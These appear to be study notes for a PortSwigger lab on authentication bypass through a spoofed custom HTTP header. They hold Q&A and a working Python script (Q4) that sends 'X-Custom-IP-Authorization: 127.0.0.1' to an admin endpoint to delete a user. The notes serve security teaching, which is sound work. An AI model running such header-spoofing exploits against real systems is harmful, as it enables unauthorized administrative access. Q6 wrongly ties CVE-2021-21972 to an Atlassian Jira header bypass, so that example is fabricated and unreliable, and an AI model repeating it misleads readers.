---
course: Web Security
topic: Information Disclosure
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain why enabling the TRACE method in a web application is considered insecure.**

The TRACE method is designed for debugging purposes, allowing a client to see what is being received at the other end of the request chain. When enabled, it can reveal sensitive information such as custom HTTP headers, cookies, and other data that should remain confidential. This can lead to various security issues, including information disclosure vulnerabilities, which can be exploited by attackers to bypass authentication mechanisms or gain unauthorized access to sensitive areas of the application.

**Q2. How would you exploit an authentication bypass vulnerability that relies on a custom HTTP header?**

To exploit an authentication bypass vulnerability that relies on a custom HTTP header, you would first need to identify the custom header being used. This can often be achieved through methods like enabling the TRACE method, inspecting network traffic, or analyzing error messages. Once identified, you can craft a request that includes the custom header with values that the application trusts, such as a localhost IP address (e.g., `127.0.0.1`). By sending this crafted request, you can bypass the authentication mechanism and gain access to restricted parts of the application.

**Q3. Why is it important not to rely on client-side input for access control decisions in the backend?**

Relying on client-side input for access control decisions in the backend is risky because client-side inputs can easily be manipulated by attackers. For example, if an application trusts a custom HTTP header containing an IP address to grant administrative privileges, an attacker can spoof this header to gain unauthorized access. This approach violates the principle of least privilege and can lead to serious security breaches. Instead, access control decisions should be based on secure, server-side mechanisms that cannot be tampered with by clients.

**Q4. Write a Python script to automate the exploitation of an authentication bypass vulnerability that uses a custom HTTP header.**

```python
import requests
import sys

def exploit_authentication_bypass(url):
    # Define the custom header and its value
    headers = {
        'X-Custom-IP-Authorization': '127.0.0.1'
    }
    
    # Define the URL to delete the user
    delete_carlos_url = url + '/admin/delete?username=carlos'
    
    try:
        # Send the GET request with the custom header
        response = requests.get(delete_carlos_url, headers=headers, verify=False)
        
        # Check if the exploitation was successful
        if 'Congratulations' in response.text:
            print('Successfully deleted Carlos user.')
        else:
            print('Could not delete the user.')
    except Exception as e:
        print(f'An error occurred: {e}')

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} <URL>')
        print('Example: python3 exploit.py http://www.example.com')
        sys.exit(1)
    
    url = sys.argv[1]
    exploit_authentication_bypass(url)
```

**Q5. How does the presence of a custom HTTP header contribute to an information disclosure vulnerability?**

A custom HTTP header contributes to an information disclosure vulnerability when it contains sensitive information that should not be exposed to the client. For example, if a custom header is used to pass an internal IP address or other identifying information, and this header is inadvertently disclosed through methods like the TRACE method or error messages, an attacker can use this information to craft malicious requests. This can lead to unauthorized access or other security breaches, as seen in the lab where the custom header `X-Custom-IP-Authorization` was used to bypass authentication.

**Q6. What recent real-world examples demonstrate the risks of relying on client-side input for access control decisions?**

One notable example is the CVE-2021-21972, a critical vulnerability found in the Atlassian Jira software. This vulnerability allowed attackers to bypass authentication by manipulating a specific HTTP header (`X-Forwarded-User`) to impersonate any user, including administrators. This demonstrates the risk of trusting client-side inputs for access control decisions, as it can lead to unauthorized access and potential compromise of the entire system.

---
<!-- nav -->
[[Web Security (PortSwigger)/17-Information Disclosure/05-Lab 4 Authentication bypass via information disclosure/09-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/17-Information Disclosure/05-Lab 4 Authentication bypass via information disclosure/00-Overview|Overview]]
